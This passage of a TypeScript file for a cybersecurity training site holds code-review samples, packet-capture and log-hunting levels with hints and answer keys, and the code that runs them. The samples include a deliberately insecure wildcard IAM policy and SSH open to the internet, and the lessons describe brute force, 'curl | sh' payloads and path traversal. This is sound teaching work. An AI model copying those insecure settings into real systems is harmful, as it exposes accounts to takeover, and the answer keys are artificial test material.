    code: ['{', '  "Version": "2012-10-17",', '  "Statement": [{', '    "Effect": "Allow",', '    "Action": "*", "Resource": "*"', '  }]', '}'],
    fixes: ['Add a Deny statement for billing', 'Allow only the actions and resources this app needs, e.g. s3:GetObject on one bucket', 'Attach it to a group instead of a user'],
    why: 'Action * on Resource * is full admin. If this app\'s credentials leak, the whole account is gone. Grant the minimum and widen only with a reason.' },
  { id: 'sg', title: 'Firewall rule', lang: 'YAML', cwe: 'Exposed management port', bad: 6, fix: 0,
    code: ['SecurityGroup:', '  Ingress:', '    - Port: 443', '      Source: 0.0.0.0/0', '    - Port: 22', '      Source: 0.0.0.0/0'],
    fixes: ['Limit SSH to the admin VPN range or use a bastion / session manager', 'Move SSH to port 2222', 'Remove the HTTPS rule instead'],
    why: 'SSH open to the whole internet invites brute force (see the Log Hunt). Public HTTPS is expected for a website; management ports should not be. Changing the port only hides from lazy scans.' },
];

/* ============================================================ Labs: levels and checks */
export const norm = (s: string) => s.trim().toLowerCase().replace(/\s+/g, '').replace(/^["']|["']$/g, '');
export type Level = { id: string; title: string; q: string; a: string | string[]; hints: string[]; lesson: string; start?: string };
export const PCAP_LEVELS: Level[] = [
  { id: 'dns-server', title: 'Find the DNS server', start: 'dns', q: 'Apply the filter dns. Which IP address answers the DNS queries?', a: '10.0.5.1', hints: ['Queries go to the server and responses come back from it.', 'Look at the Source column of the "response" rows.'], lesson: 'Filters cut a capture down to the conversation you care about. Start broad (a protocol), then narrow.' },
  { id: 'scanner', title: 'Spot the scanner', start: 'tcp.flags.syn == 1 && tcp.flags.ack == 0', q: 'One outside host sends SYN packets to many ports on 10.0.5.20. What is its IP?', a: '203.0.113.66', hints: ['The starting filter shows only connection attempts (SYN without ACK).', 'Which source repeats with a different destination port each time?'], lesson: 'A port scan is a burst of SYNs to many ports. Closed ports answer RST; open ones answer SYN-ACK.' },
  { id: 'open-ports', title: 'Which ports are open?', q: 'Which ports on 10.0.5.20 answered the scan with SYN-ACK? List them lowest first, separated by commas.', a: '21,22,80,445', hints: ['Filter for replies from the server: ip.src == 10.0.5.20 && ip.dst == 203.0.113.66', 'Then look for [SYN,ACK] in the Info column, or add && tcp.flags.reset == 0'], lesson: 'Open ports are the attack surface. FTP, SSH and SMB facing the internet would each need a strong reason.' },
  { id: 'ftp-user', title: 'Cleartext login', q: 'A backup script logged in to FTP. Which username did it use?', a: 'backup', hints: ['Try the filter ftp', 'Look for a USER request.'], lesson: 'FTP sends usernames and passwords in cleartext: anyone on the path sees them. Look at the PASS line too. Use SFTP or FTPS instead.' },
  { id: 'download', title: 'Suspicious download', q: 'Host 10.0.5.31 downloaded a program over plain HTTP. What is the file name?', a: 'invoice_2026.exe', hints: ['Filter http.request', 'The file name is the last part of the URI.'], lesson: 'An .exe from an invoice-themed site, over unencrypted HTTP, right after an email: a classic phishing payload.' },
  { id: 'domain', title: 'Where did it come from?', q: 'Which domain name served that download?', a: 'invoice-portal.example.net', hints: ['Check the HTTP Host header: http.host contains "invoice"', 'Or find the DNS query 10.0.5.31 made just before.'], lesson: 'DNS and HTTP Host headers tie an IP to a name. Blocking the domain and searching for other hosts that resolved it is the next SOC step.' },
  { id: 'tunnel', title: 'Data hiding in DNS', q: 'One host sends DNS TXT queries with long, random-looking names, all ending in the same domain. Which domain (the last three labels)?', a: 'cdn-sync.example.org', hints: ['Filter dns && ip.src == 10.0.5.52', 'Ignore the random first label: what do the names end with?'], lesson: 'DNS tunneling smuggles data out inside query names. Long, high-entropy labels to one rare domain are the giveaway.' },
  { id: 'arp-sweep', title: 'Rogue device', q: 'An internal device is asking for every address on the subnet. Which IP is it?', a: '10.0.5.99', hints: ['Filter arp', 'Which host sends "Who has" for many different addresses in a row?'], lesson: 'An ARP sweep maps the local network. A device you do not recognize doing it deserves a visit.' },
];
export const HUNT_LEVELS: Level[] = [
  { id: 'fails', title: 'Count the failures', start: 'source=auth action=failed', q: 'How many failed SSH logins are in the logs?', a: '48', hints: ['Run the starting query and read the result count.'], lesson: 'Start every hunt by measuring. One or two failures is normal; dozens is not.' },
  { id: 'top-ip', title: 'Who is guessing?', q: 'Which IP address has the most failed logins?', a: '203.0.113.66', hints: ['Add a pipe: source=auth action=failed | stats count by src_ip'], lesson: 'stats count by FIELD turns thousands of lines into a ranked list. It is the most used command in any SIEM.' },
  { id: 'breach', title: 'Did they get in?', q: 'That IP eventually logged in successfully. Which account?', a: 'deploy', hints: ['Search: src_ip=203.0.113.66 action=accepted'], lesson: 'Failures followed by a success from the same IP is the brute-force pattern that matters. Reset that account and check what it did next.' },
  { id: 'time', title: 'When?', q: 'At what time (UTC, HH:MM) did that successful login happen?', a: ['10:11', '10:11:32'], hints: ['Same search, read the time field.'], lesson: 'The first successful login time anchors the incident timeline. Everything after it is in scope.' },
  { id: 'payload', title: 'What ran?', q: 'Right after logging in, the attacker used sudo to run a script from another server. Which IP was it downloaded from?', a: '198.51.100.77', hints: ['Search: user=deploy action=sudo', 'Read the cmd field.'], lesson: 'curl | sh as root runs whatever that server sends. Block the IP, pull the script for analysis, and assume the host is compromised.' },
  { id: 'persist', title: 'Persistence', q: 'The attacker created a new user to keep access. What is its name?', a: 'sysupd', hints: ['Search: action=useradd', 'Or search the raw text: "new user"'], lesson: 'A new account with an innocent-looking name is a common way to keep access after the password is reset.' },
  { id: 'sqlmap', title: 'Web attack tool', q: 'One web client is an automated SQL injection tool. What is the tool called?', a: 'sqlmap', hints: ['source=web | stats count by ua'], lesson: 'Attack tools often announce themselves in the User-Agent. Real attackers change it, so also look at the requests themselves.' },
  { id: 'traversal', title: 'Path traversal', q: 'Which page (the path before the ?) received ../ path traversal attempts?', a: '/download.php', hints: ['Search the raw text: ../', 'Encoded versions use %2f for /.'], lesson: 'The first attempt got a 200: the server returned /etc/passwd. Check status codes to tell attempts from successes.' },
  { id: 'errors', title: 'Server errors', q: 'How many web requests returned HTTP 500?', a: '3', hints: ['source=web status=500'], lesson: 'Errors during an injection attack can mean the payload broke a query. They are worth investigating, not just fixing.' },
];
export function cryptoLevels(): Level[] { return CRYPTO.map(c => ({ id: c.id, title: c.title, q: c.q, a: c.a, hints: c.hints, lesson: c.lesson })); }

/* ============================================================ UI */
const root = typeof document === 'undefined' ? null : document.querySelector<HTMLElement>('#chal');
if (root) {
  const lab = root.dataset.lab || ''; const KEY = 'cyberhub:' + lab;
  const el = <K extends keyof HTMLElementTagNameMap>(tag: K, text = '', cls = '') => { const e = document.createElement(tag); if (text) e.textContent = text; if (cls) e.className = cls; return e; };
  const $ = <T extends HTMLElement = HTMLElement>(s: string) => root.querySelector<T>(s)!;
  let solved: string[] = []; try { const v = JSON.parse(localStorage.getItem(KEY) || '[]'); if (Array.isArray(v)) solved = v.filter(x => typeof x === 'string'); } catch { /* ignore */ }
  const save = () => { try { localStorage.setItem(KEY, JSON.stringify(solved)); } catch { /* ignore */ } };
  const levels: Level[] = lab === 'pcap' ? PCAP_LEVELS : lab === 'hunt' ? HUNT_LEVELS : lab === 'crypto' ? cryptoLevels() : REVIEW.map(r => ({ id: r.id, title: r.title, q: '', a: '', hints: [], lesson: r.why }));
  let cur = 0, hintN = 0;
  const nav = $('#ch-lvls');
  levels.forEach((l, i) => { const b = el('button', String(i + 1)); b.type = 'button'; b.dataset.i = String(i); b.title = l.title; b.setAttribute('aria-label', `Level ${i + 1}: ${l.title}`); b.addEventListener('click', () => open(i)); nav.append(b); });
  const mark = () => nav.querySelectorAll<HTMLButtonElement>('button').forEach(b => { const i = Number(b.dataset.i); b.classList.toggle('done', solved.includes(levels[i].id)); b.setAttribute('aria-current', String(i === cur)); });
  const status = () => { $('#ch-count').textContent = `${solved.filter(id => levels.some(l => l.id === id)).length} of ${levels.length} solved`; };
  const win = () => { const L = levels[cur]; if (!solved.includes(L.id)) { solved.push(L.id); save(); } const r = $('#ch-lesson'); r.hidden = false; r.querySelector('p')!.textContent = L.lesson; ($('#ch-next') as HTMLButtonElement).hidden = cur >= levels.length - 1; mark(); status(); };
  const fb = $('#ch-msg');

  /* ---- workspace per lab */
  let onOpen: (L: Level) => void = () => {};
  if (lab === 'pcap') {
    const pk = capture(); const tb = $('#pc-body'); const input = $<HTMLInputElement>('#pc-filter'); const err = $('#pc-err'); const cnt = $('#pc-count'); const det = $('#pc-detail');
    const render = (f: (p: Pkt) => boolean) => { const rows = pk.filter(f); tb.replaceChildren(...rows.map(p => { const tr = el('tr'); tr.tabIndex = 0; for (const v of [p.no, p.t.toFixed(3), p.src, p.dst, p.proto, p.info]) tr.append(el('td', String(v))); tr.addEventListener('click', () => detail(p)); tr.addEventListener('keydown', e => { if (e.key === 'Enter') detail(p); }); return tr; })); cnt.textContent = `Showing ${rows.length} of ${pk.length} packets`; };
    const detail = (p: Pkt) => { det.replaceChildren(el('b', `Packet ${p.no}`)); const add = (k: string, v: unknown) => { if (v !== undefined && v !== '') { const d = el('div'); d.append(el('span', k + ': ', 'label'), el('code', String(v))); det.append(d); } };
      add('Protocol', p.proto); add('Source', p.src + (p.sport ? ':' + p.sport : '')); add('Destination', p.dst + (p.dport ? ':' + p.dport : '')); add('TCP flags', p.flags); add('Length', p.len); add('DNS name', p.dns); add('HTTP host', p.host); add('HTTP URI', p.uri); add('User-Agent', p.ua); add('Info', p.info); det.hidden = false; };
    const apply = () => { try { render(compileFilter(input.value)); err.textContent = ''; input.removeAttribute('aria-invalid'); } catch (e) { err.textContent = (e as Error).message; input.setAttribute('aria-invalid', 'true'); } };
    $('#pc-form').addEventListener('submit', e => { e.preventDefault(); apply(); });
    $('#pc-clear').addEventListener('click', () => { input.value = ''; apply(); });
    root.querySelectorAll<HTMLButtonElement>('[data-f]').forEach(b => b.addEventListener('click', () => { input.value = b.dataset.f!; apply(); }));
    onOpen = L => { input.value = L.start || ''; det.hidden = true; apply(); };
  } else if (lab === 'hunt') {
    const ev = events(); const input = $<HTMLInputElement>('#lh-q'); const err = $('#lh-err'); const out = $('#lh-out'); const cnt = $('#lh-count');
    const apply = () => { try { const r = runQuery(ev, input.value); err.textContent = ''; input.removeAttribute('aria-invalid');
      if (r.table) { const t = el('table', '', 'lh-table'); const hr = el('tr'); r.table.cols.forEach(c => hr.append(el('th', c))); const th = el('thead'); th.append(hr); const tb = el('tbody'); r.table.rows.forEach(row => { const tr = el('tr'); row.forEach(v => tr.append(el('td', String(v)))); tb.append(tr); }); t.append(th, tb); out.replaceChildren(t); cnt.textContent = `${r.count} events matched · ${r.table.rows.length} result rows`; }
      else { const ol = el('ol', '', 'lh-lines'); r.rows.slice(0, 200).forEach(e => ol.append(el('li', e.raw))); out.replaceChildren(ol); cnt.textContent = `${r.count} events matched${r.count > 200 ? ' (showing 200)' : ''}`; } }
      catch (e) { err.textContent = (e as Error).message; input.setAttribute('aria-invalid', 'true'); } };
    $('#lh-form').addEventListener('submit', e => { e.preventDefault(); apply(); });
    root.querySelectorAll<HTMLButtonElement>('[data-q]').forEach(b => b.addEventListener('click', () => { input.value = b.dataset.q!; apply(); }));
    onOpen = L => { input.value = L.start || ''; apply(); };
  } else if (lab === 'crypto') {
    const inp = $<HTMLTextAreaElement>('#cr-in'); const outp = $('#cr-out'); const list = $('#cr-recipe'); const err = $('#cr-err'); let recipe: { id: string; p: number }[] = [];
    const run = () => { list.replaceChildren(...recipe.map((r, i) => { const li = el('li'); const op = OPS.find(o => o.id === r.id)!; li.append(el('span', op.name));
      if (op.param) { const n = el('input') as HTMLInputElement; n.type = 'number'; n.value = String(r.p); n.setAttribute('aria-label', op.param); n.addEventListener('input', () => { r.p = Number(n.value) || 0; compute(); }); li.append(n); }
      const x = el('button', '✕'); x.type = 'button'; x.setAttribute('aria-label', 'Remove ' + op.name); x.addEventListener('click', () => { recipe.splice(i, 1); run(); }); li.append(x); return li; })); compute(); };
    const compute = () => { try { outp.textContent = applyRecipe(inp.value, recipe); err.textContent = ''; } catch (e) { outp.textContent = ''; err.textContent = 'Recipe stopped: ' + (e as Error).message + '.'; } };
    const ops = $('#cr-ops'); OPS.forEach(o => { const b = el('button', o.name); b.type = 'button'; b.addEventListener('click', () => { recipe.push({ id: o.id, p: 0 }); run(); }); ops.append(b); });
    inp.addEventListener('input', compute); $('#cr-reset').addEventListener('click', () => { recipe = []; run(); });
    $('#cr-hash').addEventListener('click', async () => { outp.textContent = 'SHA-256: ' + await sha256(applyRecipe(inp.value, recipe)); });
    onOpen = L => { const c = CRYPTO.find(x => x.id === L.id)!; inp.value = c.input; recipe = []; run(); };
  }

  /* ---- review lab has its own flow */
  if (lab === 'review') {
    const code = $('#rv-code'); const fixes = $('#rv-fixes'); let lineOk = false, misses = 0;
    onOpen = () => { const s = REVIEW[cur]; lineOk = false; misses = 0; $('#ch-q').textContent = `${s.lang} · Click the line that introduces the vulnerability.`; fixes.hidden = true; fixes.replaceChildren();
      code.replaceChildren(...s.code.map((ln, i) => { const b = el('button', '', 'rv-line'); b.type = 'button'; b.append(el('span', String(i + 1), 'rv-n'), el('code', ln || ' ')); b.addEventListener('click', () => pickLine(i + 1, b)); return b; })); };
    const pickLine = (n: number, b: HTMLElement) => { const s = REVIEW[cur]; if (lineOk) return; if (n !== s.bad) { misses++; b.classList.add('miss'); fb.textContent = misses >= 2 ? 'Not that one. Look for where outside input meets something powerful: a query, the shell, the file system, the browser, or a permission.' : 'Not that line. Try again.'; return; }
      lineOk = true; b.classList.add('hit'); fb.textContent = `Found it: ${s.cwe}. Now pick the best fix.`; fixes.hidden = false; fixes.replaceChildren(el('p', 'Best fix?', 'label'), ...s.fixes.map((f, i) => { const fbn = el('button', f, 'opt'); fbn.type = 'button'; fbn.addEventListener('click', () => { if (i === s.fix) { fbn.classList.add('right'); fb.textContent = 'Correct.'; win(); } else { fbn.classList.add('wrong'); fbn.disabled = true; fb.textContent = 'That would not fix the root cause. Try another.'; } }); return fbn; })); };
  }

  function open(i: number) {
    cur = i; hintN = 0; const L = levels[i]; $('#ch-lvl').textContent = `Level ${i + 1} of ${levels.length}: ${L.title}`; if (lab !== 'review') $('#ch-q').textContent = L.q;
    $('#ch-lesson').hidden = true; fb.textContent = ''; const hb = root!.querySelector<HTMLButtonElement>('#ch-hint'); if (hb) { hb.hidden = !L.hints.length; hb.textContent = 'Stuck? Get a hint'; }
    root!.querySelector<HTMLElement>('#ch-hints')?.replaceChildren(); const a = root!.querySelector<HTMLInputElement>('#ch-a'); if (a) a.value = '';
    onOpen(L); mark();
  }
  root.querySelector('#ch-hint')?.addEventListener('click', () => { const H = levels[cur].hints; if (!H.length) return; const box = $('#ch-hints'); if (hintN < H.length) { box.append(el('li', H[hintN])); hintN++; } $('#ch-hint').textContent = hintN >= H.length ? 'No more hints' : 'Another hint'; });
  root.querySelector('#ch-form')?.addEventListener('submit', async e => { e.preventDefault(); const L = levels[cur]; const v = norm($<HTMLInputElement>('#ch-a').value); if (!v) return;
    let ok: boolean; if (lab === 'crypto' && L.id === 'hash') ok = v.length >= 8 && (await sha256('CISO CyberHub')).startsWith(v); else ok = (Array.isArray(L.a) ? L.a : [L.a]).some(x => norm(x) === v || norm(x).replace(/^\//, '') === v.replace(/^\//, ''));
    fb.textContent = ok ? '✔ Correct. Level complete.' : '✘ Not quite. Check the evidence again, or take a hint.'; if (ok) win(); });
  $('#ch-next').addEventListener('click', () => open(Math.min(cur + 1, levels.length - 1)));
  const first = levels.findIndex(l => !solved.includes(l.id)); open(first < 0 ? 0 : first); status();
}
